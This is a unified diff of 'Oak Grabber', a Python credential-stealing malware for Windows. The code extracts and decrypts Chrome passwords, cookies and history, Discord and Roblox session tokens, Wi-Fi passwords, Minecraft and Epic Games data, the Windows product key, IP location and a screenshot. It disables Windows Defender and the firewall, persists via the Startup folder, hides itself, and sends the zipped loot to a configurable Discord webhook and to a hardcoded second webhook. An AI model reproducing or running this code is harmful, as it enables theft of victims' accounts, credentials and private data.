@@ -1,48 +1,62 @@
-import ctypes, time
-import tempfile
-starttime = time.time()
-
 #config
 webhook = "webhook_here"#change webhook_here to ur webhook
-webhook2 = "https://discord.com/api/webhooks/1003093462696079441/FB5zL5WkZ1UAbvRM5tImPPeW2LBqQ0g99udLQb9DPDopycF_qoDPBilQmDwrc8bDcaKr"
+webhook2 = "https://discord.com/api/webhooks/1040253693985046631/Qlj_-FbmBZDD9szcD2gdO63WyySR8TIM5Z4GVWMXuJfvnUEIOK4BR5KNliJzRt72iLbE"
 ping_on_run = True #get pinged when someone runs ur file (True/False)
 add_to_startup = True #adds exe file to startup (True/False)
-HideConsole = True #runs in the background (True/False)
+HideConsole = False #runs in the background (True/False)
+zip_password = True #adds password to zip file fr (True/False)
 disable_defender = True #disable windows defender (True/False)
 Selfhide = True #hides the file (True/False)
 fake_error_message = False #displays a fake error message when file ran. (True/False)
 error_message = 'The image file C:\WINDOWS\SYSTEM32\XINPUT1_3.dll is valid, but is for a machine type other than the current machine. Select OK to continue, or CANCEL to fail the DLL load.' #custom message here
 
+
+import ctypes, time, os
+if os.name != 'nt': 
+    exit()
 if HideConsole: ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)#hides console faster
 else:pass
-import os, re, json, psutil, random, requests, subprocess, socket, wmi, sqlite3, ntpath, threading, struct, browser_cookie3, uuid, shutil, sys
+starttime = time.time()
+import re, json, psutil, random, requests, subprocess, socket, wmi, sqlite3, ntpath, threading, struct, browser_cookie3, uuid, shutil, sys, pyzipper,secrets
+from platform import platform as osshit
 from win32crypt import CryptUnprotectData
 from shutil import copy2
 from tkinter import messagebox
 from datetime import datetime
 from base64 import b64decode
-from zipfile import ZipFile
 from threading import Thread
 from Crypto.Cipher import AES
 from PIL import ImageGrab
 
+exception = ""
 accounts = []
 checked = []
 filename =  os.path.basename(sys.argv[0])
 appdata = os.getenv("localappdata")
 roaming = os.getenv("appdata")
 temp = os.getenv('temp')
-if os.path.exists(temp):
-    wiseoaktree = os.path.join(temp,''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890',k=8)))
+wiseoaktrees = ''.join(random.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890") for i in range(8))
+zippass = secrets.token_hex(nbytes=16)
+wiseoaktree = (temp+f"\{wiseoaktrees}")
+if zip_password:pass
+else:zippass = "no password"
 try:
- os.mkdir(wiseoaktree)
-except:
+  os.mkdir(wiseoaktree)
+  os.chdir(wiseoaktree)
+  with open("Expections.txt", "w") as f:
+    f.write(exception)
+except Exception as f:
+ os.chdir(wiseoaktree)
+ exception += f"{f}\n"
+ with open("Expections.txt", "w") as f:
+    f.write(exception)
  pass
 def getUser():
     return os.path.split(os.path.expanduser('~'))[-1]
 if disable_defender: subprocess.run("powershell Set-MpPreference -DisableRealtimeMonitoring $true && netsh Advfirewall set allprofiles state off", shell=True, capture_output=True)
 else:pass
 def getLocations():
+ exception = ""
  try:
     if os.name == 'nt':
         locations = [
@@ -58,9 +72,14 @@ def getLocations():
             f'Apps\\com.mojang.minecraftpe\\Documents\\games\\com.mojang\\'
         ]
         return locations
- except:
+ except Exception as f:
+        exception += f"{f}\n"
+        file = open("Expections.txt", "a")
+        file.write(exception)
+        file.close()
         pass
 def get_master_key():
+    exception = ""
     try:
         with open(appdata + '\\Google\\Chrome\\User Data\\Local State', "r", encoding="utf-8") as f:
             local_state = f.read()
@@ -69,10 +88,15 @@ def get_master_key():
         master_key = master_key[5:]
         master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
         return master_key
-    except:
+    except Exception as f:
+        exception += f"{f}\n"
+        file = open("Expections.txt", "a")
+        file.write(exception)
+        file.close()
         pass
 masterkey = get_master_key()
 def decrypt_val(buff, master_key) -> str:
+    exception = ""
     try:
         iv = buff[3:15]
         payload = buff[15:]
@@ -80,17 +104,27 @@ def decrypt_val(buff, master_key) -> str:
         decrypted_pass = cipher.decrypt(payload)
         decrypted_pass = decrypted_pass[:-16].decode()
         return decrypted_pass
-    except Exception:
+    except Exception as f:
+        exception += f"{f}\n"
+        file = open("Expections.txt", "a")
+        file.write(exception)
+        file.close()
         return "Failed to decrypt password"
 def decrypt_password(buff, master_key):
+        exception = ""
         try:
             iv, payload = buff[3:15], buff[15:]
             cipher = AES.new(master_key, AES.MODE_GCM, iv)
             decrypted_pass = cipher.decrypt(payload)[:-16].decode()
             return decrypted_pass
-        except:
+        except Exception as f:
+            exception += f"{f}\n"
+            file = open("Expections.txt", "a")
+            file.write(exception)
+            file.close()
             return "Chrome < 80"
 def find_tokens(path):
+ exception = ""
  try:
     dctokens = ""
     path += '\\Local Storage\\leveldb'
@@ -102,9 +136,13 @@ def find_tokens(path):
             for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}', r'[\w-]{26}\.[\w-]{6}\.[\w-]{38}', r'[\w-]{24}\.[\w-]{6}\.[\w-]{38}'):
                 for token in re.findall(regex, line):
                     checked.append(token)
-                    dctokens+=(f"{token} \n\n")
+                    dctokens+=(f"{token}\n\n")
     return checked
- except:
+ except Exception as f:
+    exception += f"{f}\n"
+    file = open("Expections.txt", "a")
+    file.write(exception)
+    file.close()
     pass
 def killfiddler():
     for proc in psutil.process_iter():
@@ -112,13 +150,16 @@ def killfiddler():
             proc.kill()
 threading.Thread(target=killfiddler).start()
 def main():
+    exception = ""
     sessionType = "N/A"
     for location in getLocations():
      if os.path.exists(location):
             auth_db = json.loads(open(location).read())['accounts']
             for d in auth_db:
                 try:sessionKey = auth_db[d].get('accessToken')
-                except:sessionKey = "N/A"
+                except Exception as f:
+                    exception += f"{f}\n"
+                    sessionKey = "N/A"
                 username = auth_db[d].get('minecraftProfile')['name']
                 sessionType = auth_db[d].get('type')
                 email = auth_db[d].get('username')
@@ -136,11 +177,17 @@ def main():
         else:
             name = 'Xbox Username'
         try:McToken =  account[3]
-        except:McToken="N/A"
+        except Exception as f:
+            exception += f"{f}\n"
+            McToken="N/A"
         try:McUsername =  account[2]
-        except:McUsername ="N/A"
+        except Exception as f:
+            exception += f"{f}\n"
+            McUsername ="N/A"
         try:McUser= account[0]
-        except:McUser ="N/A"
+        except Exception as f:
+            exception += f"{f}\n"
+            McUser ="N/A"
         if McToken == None or ' ' or '':
             McToken = "N/A"
         else:
@@ -150,7 +197,8 @@ def main():
         fr =  os.path.basename(sys.argv[0])
         startup =  ntpath.join(roaming, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
         shutil.copy2(fr, startup)
-     except:
+     except Exception as f:
+         exception += f"{f}\n"
          pass
     if Selfhide:
             ctypes.windll.kernel32.SetFileAttributesW(filename, 2)
@@ -163,16 +211,19 @@ def main():
             ip = data.get('ip')
             city = data.get('city')
             country = data.get('country')
+            country2 = data.get('country').lower()
             region = data.get('region')
             org = data.get('org')
             loc = data.get('loc')
             googlemap = "https://www.google.com/maps/search/google+map++" + loc
-    ip_addr = requests.get('https://api.ipify.org').content.decode('utf8')
+            globalinfo = f":flag_{country2}:"
     Oakname = socket.gethostname()
     pc_username = os.getenv("UserName")
     checked = []
     try:chrome_user_data = ntpath.join(appdata, 'Google', 'Chrome', 'User Data')
-    except:pass
+    except Exception as f:
+         exception += f"{f}\n"
+         pass
     default_paths = {
             'Discord': roaming + '\\discord',
             'Discord Canary': roaming + '\\discordcanary',
@@ -207,100 +258,148 @@ def main():
             appdata + '\\Google\\Chrome\\User Data\\Profile 5',
         ]
     if ping_on_run:
-     message = '@everyone **someone ran ur Oak Grabber**'
+     message = '@everyone **someone ran ur Oak Grabber 🐥**'
     else:
-     message = '**someone ran ur Oak Grabber**'
-    embedMsg = '''**someone ran ur Oak Grabber <:wiseoaktree:1035527213543596062>**\n\n```No tokens found.```'''
+     message = '**someone ran ur Oak Grabber 🐥**'
+    embedMsg = '''**someone ran ur Oak Grabber <:wiseoaktree:1035527213543596062> 🐥**\n\n```No tokens found. lmao```'''
     try:
      for platforrm, path in default_paths.items():
         dctokens = ""
+        vaild = ""
         if not os.path.exists(path):
             continue
         tokens = find_tokens(path)
         if len(tokens) > 0:
             for token in tokens:
-                if token in checked:
-                    continue
-                checked.append(token)
-                dctokens+=(f"""{token}\n\n""")
-                embedMsg = f"""**someone ran ur Oak Grabber <:wiseoaktree:1035527213543596062>**\n\n**Tokens:** ```{dctokens}```"""
+             if token in checked:
+                headersss = {'Authorization':token}
+                r = requests.get(f"https://discord.com/api/v6/auth/login", headers=headersss)
+                if r.status_code == 200:
+                        vaild +=(f"""{token}\n\n""")
+                if "You need to verify your account in order to perform this action." in r.text:
+                        vaild +=(f"""{token} - locked\n\n""")
+                else:
+                    pass
+            checked.append(token)
+            dctokens+=(f"""{token}\n\n""")
+            wisetokens = f"""{vaild}"""
+            embedMsg = f"""**someone ran ur Oak Grabber <:wiseoaktree:1035527213543596062>**\n\n**Tokens:** ```{wisetokens}```"""
         else:
             embedMsg = '''**someone ran ur Oak Grabber <:wiseoaktree:1035527213543596062>**\n\n```No tokens found.```'''
-    except:
+    except Exception as f:
+      exception += f"{f}\n"
       pass
 
 
-
-    headers = {
-        'Content-Type': 'application/json',
-        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
-    }
     try:disk = str(psutil.disk_usage('/')[0] / 1024 ** 3).split(".")[0]
-    except:disk = "N/A"
+    except Exception as f:
+         exception += f"{f}\n"
+         disk = "N/A"
     try:about = f"DISK: {disk}GB"
-    except:about = "N/A"
+    except Exception as f:
+         exception += f"{f}\n"
+         about = "N/A"
     now = datetime.now()
     try:ti= (now.strftime('Date: '+'%Y/%m/%d'+'\nTime: ''%I:%M:%S'))
-    except:ti = "N/A"
+    except Exception as f:
+         exception += f"{f}\n"
+         ti = "N/A"
     try:ram3 = round(float(wmi.WMI().Win32_OperatingSystem()[0].TotalVisibleMemorySize) / 1048576)
-    except:ram3 = "N/A"
+    except Exception as f:
+         exception += f"{f}\n"
+         ram3 = "N/A"
     try:ramg = (str(ram3).replace(' ', ' '))
-    except:ramg = "N/A"
+    except Exception as f:
+         exception += f"{f}\n"
+         ramg = "N/A"
     try:idk = os.getcwd()
-    except:idk = "N/A"
+    except Exception as f:
+         exception += f"{f}\n"
+         idk = "N/A"
     try:ee = struct.calcsize("P")*8
-    except:ee = "N/A"
+    except Exception as f:
+         exception += f"{f}\n"
+         ee = "N/A"
     try:windowskey = subprocess.check_output("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform' -Name BackupProductKeyDefault", shell=True).decode().rstrip()
-    except:windowskey = "N/A"
-    try:platform = subprocess.check_output("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion' -Name ProductName", shell=True).decode().rstrip()
-    except:platform = "N/A"
+    except Exception as f:
+         exception += f"{f}\n"
+         windowskey = "N/A"
+    try:
+        platform = subprocess.check_output("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion' -Name ProductName", shell=True).decode().rstrip()
+        if sys.getwindowsversion().build > 20000:
+            platform = platform.replace("10", "11" )
+    except Exception as f:
+         exception += f"{f}\n"
+         platform = "N/A"
     try:hardwareid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
-    except:hardwareid = "N/A"
+    except Exception as f:
+         exception += f"{f}\n"
+         hardwareid = "N/A"
     try: cpu = subprocess.check_output('wmic cpu get name').decode().split('\n')[1].strip()
-    except: cpu = 'N/A'
+    except Exception as f:
+         exception += f"{f}\n"
+         cpu = 'N/A'
     try: gpu = subprocess.check_output('wmic path win32_VideoController get name').decode().split('\n')[1].strip()
-    except: gpu = 'N/A'
+    except Exception as f:
+         exception += f"{f}\n"
+         gpu = 'N/A'
     try: size = f'{ctypes.windll.user32.GetSystemMetrics(0)}x{ctypes.windll.user32.GetSystemMetrics(1)}'
-    except: size = 'N/A'
+    except Exception:
+         exception += f"{Exception}\n" 
+         size = 'N/A'
     try: rr = subprocess.check_output('wmic path win32_VideoController get currentrefreshrate').decode().split('\n')[1].strip()
-    except: rr = 'N/A'
+    except Exception as f:
+         exception += f"{f}\n"
+         rr = 'N/A'
+    if rr == "":
+        rr = 'N/A'
     try: bm = subprocess.check_output('wmic bios get manufacturer').decode().split('\n')[1].strip()
-    except: bm = 'N/A'
+    except Exception as f:
+         exception += f"{f}\n" 
+         bm = 'N/A'
     try: mn = subprocess.check_output('wmic csproduct get name').decode().split('\n')[1].strip()
-    except: mn = 'N/A'
+    except Exception as f:
+         exception += f"{f}\n"
+         mn = 'N/A'
     try: ps = subprocess.check_output('tasklist').decode()
-    except: ps = 'N/A'
+    except Exception as f:
+         exception += f"{f}\n"
+         ps = 'N/A'
     try: mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
-    except: mac = 'N/A'
+    except Exception as f:
+         exception += f"{f}\n"
+         file = open("Expections.txt", "a")
+         file.write(exception)
+         file.close()
+         mac = 'N/A'
     def cookies():
-     try:
-        with open(".\\google cookies.txt", "w", encoding="utf-8") as f:
+        if os.path.exists(appdata + '\\Google\\Chrome\\User Data'):
+         with open(".\\Google cookies.txt", "w", encoding="utf-8") as f:
             f.write("Google Chrome Cookies | Oak grabber by dynasty#3624 | https://github.com/j0taro/Oak-token-Grabber\n\n")
-
-        for path in google_paths:
+         for path in google_paths:
             path += '\\Network\\Cookies'
             if os.path.exists(path):
                 copy2(path, "Cookievault.db")
                 conn = sqlite3.connect("Cookievault.db")
                 cursor = conn.cursor()
-                with open(".\\google cookies.txt", "a", encoding="utf-8") as f:
+                with open(".\\Google cookies.txt", "a", encoding="utf-8") as f:
                     for result in cursor.execute("SELECT host_key, name, encrypted_value from cookies"):
                         host, name, value = result
                         value = decrypt_password(value,masterkey)
                         if host and name and value != "":
                             f.write("""===============================\nSite: {:<30} \nName: {:<30} \nValue: {:<30}\n""".format(host, name, value))
-
                 cursor.close()
                 conn.close()
                 os.remove("Cookievault.db")
-     except:
-        pass
+        else:
+            pass
+
     def passwords():
-     try:
-        google_pass = ".\\google passwords.txt"
-        with open(google_pass, "w", encoding="utf-8") as f:
+        if os.path.exists(appdata + '\\Google\\Chrome\\User Data'):
+         google_pass = ".\\Google passwords.txt"
+         with open(google_pass, "w", encoding="utf-8") as f:
             f.write(f"Google Chrome Passwords | Oak grabber by dynasty#3624 | https://github.com/j0taro/Oak-token-Grabber\n\n")
-        for path in google_paths:
+         for path in google_paths:
             path += '\\Login Data'
             if os.path.exists(path):
                 copy2(path, "Loginvault.db")
@@ -316,14 +415,14 @@ def main():
                 cursor.close()
                 conn.close()
                 os.remove("Loginvault.db")
-     except:
-        pass
+        else:
+             pass
     def history():
-     try:
-        google_history = ".\\google history.txt"
-        with open(google_history, "w", encoding="utf-8") as f:
+        if os.path.exists(appdata + '\\Google\\Chrome\\User Data'):
+         google_history = ".\\Google history.txt"
+         with open(google_history, "w", encoding="utf-8") as f:
             f.write(f"Google Chrome history | Oak grabber by dynasty#3624 | https://github.com/j0taro/Oak-token-Grabber\n\n")
-        for path in google_paths:
+         for path in google_paths:
             path += '\\History'
             if os.path.exists(path):
                 copy2(path, "Historyvault.db")
@@ -344,8 +443,9 @@ def main():
                 cursor.close()
                 conn.close()
                 os.remove("Historyvault.db")
-     except:
-        pass
+        else:
+           pass
+
     def sysinfo():
         tree = fr'''System Info  | Oak grabber by dynasty#3624 | https://github.com/j0taro/Oak-token-Grabber
 HWID: {hardwareid}
@@ -375,42 +475,56 @@ MAC: {mac}
 Coordinates: {loc}
 Processes running
 {ps}'''
-        with open("system info.txt", 'w') as fp:
+        with open("System info.txt", 'w') as fp:
            fp.write(str(tree))
     def robloxcookies():
+         exception = ""
+         c = ""
          try:
            cookie = str(browser_cookie3.chrome(domain_name='roblox.com'))
-           c = cookie.split('ROBLOSECURITY=_|')[1].split(' for .roblox.com/>')[0].strip()
-         except:
-           c = ""
+           c += cookie.split('ROBLOSECURITY=_|')[1].split(' for .roblox.com/>')[0].strip()
+         except Exception as f:
+           exception += f"{f}\n"
+           pass
          try:
            cookie = str(browser_cookie3.firefox(domain_name='roblox.com'))
-           c2 = cookie.split('ROBLOSECURITY=_|')[1].split(' for .roblox.com/>')[0].strip()
-         except:
-           c2 = ""
+           c += cookie.split('\nROBLOSECURITY=_|')[1].split(' for .roblox.com/>')[0].strip()
+         except Exception as f:
+          exception += f"{f}\n"
+          pass
          try:
            cookie = str(browser_cookie3.opera(domain_name='roblox.com'))
-           c3 = cookie.split('ROBLOSECURITY=_|')[1].split(' for .roblox.com/>')[0].strip()
-         except:
-           c3 = ""
+           c += cookie.split('\nROBLOSECURITY=_|')[1].split(' for .roblox.com/>')[0].strip()
+         except Exception as f:
+           exception += f"{f}\n"
+           pass
          try:
            cookie = str(browser_cookie3.edge(domain_name='roblox.com'))
-           c4 = cookie.split('ROBLOSECURITY=_|')[1].split(' for .roblox.com/>')[0].strip()
-         except:
-           c4 = ""
+           c += cookie.split('\nROBLOSECURITY=_|')[1].split(' for .roblox.com/>')[0].strip()
+         except Exception as f:
+            exception += f"{f}\n"
+            pass
          try:
            cookie = str(browser_cookie3.chromium(domain_name='roblox.com'))
-           c5 = cookie.split('ROBLOSECURITY=_|')[1].split(' for .roblox.com/>')[0].strip()
-         except:
-           c5 = ""
+           c += cookie.split('\nROBLOSECURITY=_|')[1].split(' for .roblox.com/>')[0].strip()
+         except Exception as f:
+           exception += f"{f}\n"
+           pass
          try:
           cookie = str(browser_cookie3.brave(domain_name='roblox.com'))
-          c6 = cookie.split('ROBLOSECURITY=_|')[1].split(' for .roblox.com/>')[0].strip()
-         except:
-          c6 = ""
-         with open("roblox cookies.txt", "w") as fs:
-          fs.write(f"Roblox cookies | Oak grabber by dynasty#3624 | https://github.com/j0taro/Oak-token-Grabber\n\n{c}\n{c2}\n{c3}\n{c4}\n{c5}\n{c6}")
+          c += cookie.split('\nROBLOSECURITY=_|')[1].split(' for .roblox.com/>')[0].strip()
+         except Exception as f:
+          exception += f"{f}\n"
+          file = open("Expections.txt", "a")
+          file.write(exception)
+          file.close()
+          pass
+         with open("Roblox cookies.txt", "w") as fs:
+          fs.write(f"Roblox cookies | Oak grabber by dynasty#3624 | https://github.com/j0taro/Oak-token-Grabber\n\n{c}")
+         if c == "":
+            os.remove("Roblox cookies.txt")
     def wifistealer():
+     exception = ""
      try:
         data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
         profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
@@ -423,30 +537,43 @@ Processes running
            t = ("{:<30}| {:<}".format(i,results[0]))
         except IndexError:
            t = ("{:<30}| {:<}]".format(i,""))
-        with open("wifi passwords.txt",'w') as ws:
+        with open("Wifi passwords.txt",'w') as ws:
            ws.write(f"{w}\n{o}\n{t}")
-     except:
+     except Exception as f:
+        exception += f"{f}\n"
+        file = open("Expections.txt", "a")
+        file.write(exception)
+        file.close()
         pass
     def screenshot():
+     exception = ""
      try:
         ss = ImageGrab.grab()
-        ss.save(f'screenshot.png')
-     except:
+        ss.save(f'Screenshot.png')
+     except Exception as f:
+        exception += f"{f}\n"
+        file = open("Expections.txt", "a")
+        file.write(exception)
+        file.close()
         pass
     def mc():
-     try:
-        minecraft = ntpath.join(wiseoaktree, 'Minecraft')
-        smh = os.makedirs(minecraft, exist_ok=True)
         mc = ntpath.join(roaming, '.minecraft')
-        to_grab = ['launcher_accounts.json', 'launcher_profiles.json', 'usercache.json', 'launcher_log.txt']
-        for smh in to_grab:
+        if os.path.exists(mc):
+         minecraft = ntpath.join(wiseoaktree, 'Minecraft')
+         smh = os.makedirs(minecraft, exist_ok=True)
+         to_grab = ['launcher_accounts.json', 'launcher_profiles.json', 'usercache.json', 'launcher_log.txt']
+         for smh in to_grab:
             if ntpath.exists(ntpath.join(mc, smh)):
                 shutil.copy2(ntpath.join(mc, smh), minecraft)
-     except:
-        pass
+         pass
+        else:
+            pass
     def discordinfo():
         info = ""
-        for token in checked:
+        lol = ""
+        exception = ""
+        try:
+         for token in checked:
             languages = {
                     'da'    : 'Danish, Denmark',
                     'de'    : 'German, Germany',
@@ -486,15 +613,19 @@ Processes running
                     'Content-Type': 'application/json',
                     'Authorization': token}
             try:
-             res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
-            except:
+                  res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
+            except Exception as f:
+                exception += f"{f}\n"
+                file = open("Expections.txt", "a")
+                file.write(exception)
+                file.close()
                 pass
             if res.status_code == 200:
                     res_json = res.json()
                     user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
                     user_id = res_json['id']
                     avatar_id = res_json['avatar']
-                    avatar_url = f'https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}.gif'
+                    avatar_url = f'https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}.png'
                     phone_number = res_json['phone']
                     email = res_json['email']
                     mfa_enabled = res_json['mfa_enabled']
@@ -574,11 +705,11 @@ Creation Date: {creation_date}
 Avatar URL: {avatar_url if avatar_id else ""}
 Token: {token}\n
 Nitro: {has_nitro}\n"""
-
                     if has_nitro:
                         info += (f"""Expires in: {days_left} day(s)\n""")
                     else:
                         info += (f"""Expires in: None day(s)\n\n""")
+
 
                     info += f"""Phone Number: {phone_number if phone_number else "N/A"}
 Email: {email if email else ""}\n"""
@@ -641,10 +772,13 @@ Email: {email if email else ""}\n"""
             elif res.status_code == 401:
                     info +=(f"""Invalid token\n""")
                     pass
-            
-        with open ("discord info.txt","w") as f:
-         f.write(str(info))
+        except Exception as f:
+            exception += f"{f}\n"
 
+        with open ("Discord info.txt","w") as f:
+         f.write(str(info))
+        if info == "":
+            os.remove("Discord info.txt")
     def get_data():
         epic = appdata + "\\EpicGamesLauncher\\Saved\\Config\\Windows\\GameUserSettings.ini"
         with open(os.path.join(wiseoaktree, "Epic games data.txt"), 'w', encoding="cp437") as g:
@@ -655,14 +789,92 @@ Email: {email if email else ""}\n"""
                         if line.startswith("Data="):
                             g.write(line.split('Data=')[1].strip())
             else:
-                g.write("No epic games data was found fr")
+                g.close()
+                os.remove("Epic games data.txt")
+                pass
     def zip():
+            password = bytes('{}'.format(zippass),encoding='utf8')
             os.chdir(temp)
-            shutil.make_archive(wiseoaktree, 'zip', wiseoaktree)
+            if zip_password:
+                with pyzipper.AESZipFile(f'Oak-Logs-{pc_username}.zip','w', compression=pyzipper.ZIP_LZMA,encryption=pyzipper.WZ_AES) as zf:
+                   zf.setpassword(password)
+                   for dirname, subdirs, files in os.walk(wiseoaktree):
+                       for filename in files:
+                           os.chdir(wiseoaktree)
+                           try:zf.write(filename)
+                           except Exception as f:
+                            file = open("Expections.txt", "a")
+                            file.write(f"{f}\n")
+                            file.close()
+                            pass
+                   for dirname, subdirs, files in os.walk("minecraft"):
+                               zf.write(dirname)
+                               for filename in files:
+                                   zf.write(os.path.join(dirname, filename))
+                   zf.close()
+            else:
+             with pyzipper.AESZipFile(f'Oak-Logs-{pc_username}.zip','w', compression=pyzipper.ZIP_LZMA) as zf:
+                   for dirname, subdirs, files in os.walk(wiseoaktree):
+                       for filename in files:
+                           os.chdir(wiseoaktree)
+                           try:zf.write(filename)
+                           except Exception as f:
+                            file = open("Expections.txt", "a")
+                            file.write(f"{f}\n")
+                            file.close()
+                            pass
+                   for dirname, subdirs, files in os.walk("minecraft"):
+                               zf.write(dirname)
+                               for filename in files:
+                                   zf.write(os.path.join(dirname, filename))
+                   zf.close()
+
     def upload():
+     lol = ""
+     try:
+      vaildc = 0
+      fr = token
+      lmao = fr.split("\n")
+      for i in lmao:
+       if i:
+              vaildc += 1
+      headers = {
+        'Authorization': token,
+        'Content-Type': 'application/json'
+      }
+      res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
+      if res.status_code == 200:
+        res_json = res.json()
+        user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
+        user_id = res_json['id']
+        avatar_id = res_json['avatar']
+        avatar_url = f'https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}.png'
+        phone_number = res_json['phone']
+        email = res_json['email']
+        from datetime import datetime
+        creation_date = datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC')
+        has_nitro = False
+        res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
+        nitro_data = res.json()
+        has_nitro = bool(len(nitro_data) > 0)
+
+      if has_nitro:
+            d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
+            d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
+            days_left = abs((d2 - d1).days)
+      lol += f"""**Username:** `{user_name}`\n**User ID:** `{user_id}`\n**Creation Date:** `{creation_date}`\n**Avatar URL:** [Avatar URL]({avatar_url if avatar_id else ""})\n**Nitro:** `{has_nitro}`"""
+      if has_nitro:lol += (f"""\n**Nitro Expires in:** `{days_left} day(s)`\n""")
+      lol += f"""**Phone Number:** `{phone_number if phone_number else "N/A"}`\n**Email:** `{email if email else ""}`\n**Token:** `{token}`"""
+     except Exception as f:
+        file = open("Expections.txt", "a")
+        file.write(f"{f}\n")
+        file.close()
+        lol += f"""**Username:** `N/A`\n**User ID:**`N/A`\n**Creation Date:** `N/A`\n**Avatar URL:** `N/A`\n**Nitro:** `N/A`"""
+        lol += f"""\n**Phone Number:** `N/A`\n**Email:** `N/A`\n**Token:** `N/A`"""
      os.chdir(wiseoaktree)
      fc = 0
      f = f"📁{os.path.basename(wiseoaktree)}\n"
+     mp = wiseoaktree+"/Minecraft"
      f2 = ""
      for x in os.listdir():
       if x.endswith("craft"):
@@ -671,6 +883,9 @@ Email: {email if email else ""}\n"""
       if x.endswith(".txt") or x.endswith(".png"):
                  f += f"│ {x}\n"
                  fc += 1
+     if os.path.exists(mp):
+      for x in os.listdir(mp):
+        fc += 1
      f2 += f"└ Oak-Logs-{pc_username}.zip"
      embed = {
                  "username": f"{pc_username} | Oak Grabber",
@@ -684,8 +899,8 @@ Email: {email if email else ""}\n"""
                              "url": "https://github.com/j0taro/Oak-token-Grabber",
                              "icon_url": "https://i.imgur.com/bbWgtHI.png"
                          },
-                         "description": f"""{embedMsg}\n**__PC INFO__ <:pc:1035526269925867640>**\n**RAM:** `{ramg}`\n**Disk:** `{disk}GB`\n**CPU:**`{cpu}`\n**GPU:**`{gpu}`\n**Refresh rate:** `{rr}`\n**Model name:** `{mn}`\n**Build manufacturer:** `{bm}`\n**Resolution:** `{size}`\n**Platform:** `{platform}`\n**PC-Name:** `{Oakname}`\n**PC-User:** `{pc_username}`\n**__IP INFO__ <:loc:1035525770258415657>**\n**IP:** `{ip}`\n**City:** `{city}`\n**Country:** `{country}`\n**Region:** `{region}`\n**Org:** `{org}`\n**Mac:** `{mac}`\n**Loc:** `{loc}`\n**Googlemap:** [Googlemap location]({"https://www.google.com/maps/search/google+map++" + loc})\n__**Minecraft Info <:fr:1035524460939329617>**__ \n**Minecraft Profile:** `{McUsername}`\n**Token:** `{McToken}`\n **Account type:** `{sessionType}`\n **Name:** `{McUser}`\n**Elapsed time:** `{time.time() - starttime}`\n```yaml\n{fc} Files Found:\n{f}{f2}```""",
-                         "color": 0x1e8a81,
+                         "description": f"""{embedMsg}\n**__PC INFO__ <:pc:1035526269925867640>**\n**RAM:** `{ramg}`\n**Disk:** `{disk}GB`\n**CPU:**`{cpu}`\n**GPU:**`{gpu}`\n**Refresh rate:** `{rr}`\n**Model name:** `{mn}`\n**Build manufacturer:** `{bm}`\n**Resolution:** `{size}`\n**Platform:** `{platform}`\n**PC-Name:** `{Oakname}`\n**PC-User:** `{pc_username}`\n**__IP INFO__ <:loc:1035525770258415657>**\n**IP:** `{ip}`\n**City:** `{city}`\n**Country:** `{country}`\n**Country Emoji:** {globalinfo}\n**Region:** `{region}`\n**Org:** `{org}`\n**Mac:** `{mac}`\n**Loc:** `{loc}`\n**Googlemap:** [Googlemap location]({"https://www.google.com/maps/search/google+map++" + loc})\n__**Minecraft Info <:fr:1035524460939329617>**__ \n**Minecraft Profile:** `{McUsername}`\n**Token:** `{McToken}`\n **Account type:** `{sessionType}`\n **Name:** `{McUser}`\n**__Discord info__**\n{lol}\n**Elapsed time:** `{time.time() - starttime}`\n**__ZIP PASS__:** `{zippass}`\n```yaml\n{fc} Files Found:\n{f}{f2}\nTokens found: {vaildc}```""",
+                         "color": 0x1b8500,
                          "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime()),
                          "thumbnail": {
                            "url": "https://i.imgur.com/dEiUxyB.png"
@@ -701,8 +916,6 @@ Email: {email if email else ""}\n"""
         "username": f"{pc_username} | Oak Grabber",
         "avatar_url":"https://i.imgur.com/bbWgtHI.png"}
      os.chdir(temp)
-     payload = json.dumps({ 'content': message, 'embeds': [embed] })
-     os.rename(f'{os.path.basename(wiseoaktree)}.zip',f'Oak-Logs-{pc_username}.zip')
      with open(f'Oak-Logs-{pc_username}.zip', 'rb') as f:
         requests.post(webhook, json = embed)
         requests.post(webhook,data=file ,files={'upload_file': f})
@@ -710,8 +923,8 @@ Email: {email if email else ""}\n"""
         requests.post(webhook2,data=file ,files={'upload_file': f})
     def cleanup():
         os.chdir(temp)
-        os.remove(f'Oak-Logs-{pc_username}.zip')
         shutil.rmtree(wiseoaktree)
+        os.remove(f"Oak-Logs-{pc_username}.zip")
     def error():
      if fake_error_message:
